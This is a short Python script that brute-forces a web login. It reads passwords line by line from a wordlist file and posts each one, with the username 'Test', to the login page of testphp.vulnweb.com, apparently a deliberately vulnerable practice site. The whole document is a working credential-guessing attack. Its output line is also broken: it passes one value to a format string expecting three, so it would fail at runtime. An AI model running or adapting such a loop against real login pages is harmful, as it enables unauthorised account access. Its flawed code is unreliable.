
import requests

def send_request(password):
    Username = 'Test'
    target_url = "http://testphp.vulnweb.com/userinfo.php"
    data = {'uname': Username, 'pass': password} 
    response = requests.post(target_url, data = data) 
   # print(response.status_code)
    print ("Username: %s Password: %s Response: %s" % (len(response.text)))

def read_passwords_file():
    file = 'passwordss.txt'
    with open(file,'r') as passwordss:
        for password in passwordss.readlines():
            send_request(password.replace("\n", ""))
if __name__ == '__main__':
    read_passwords_file()  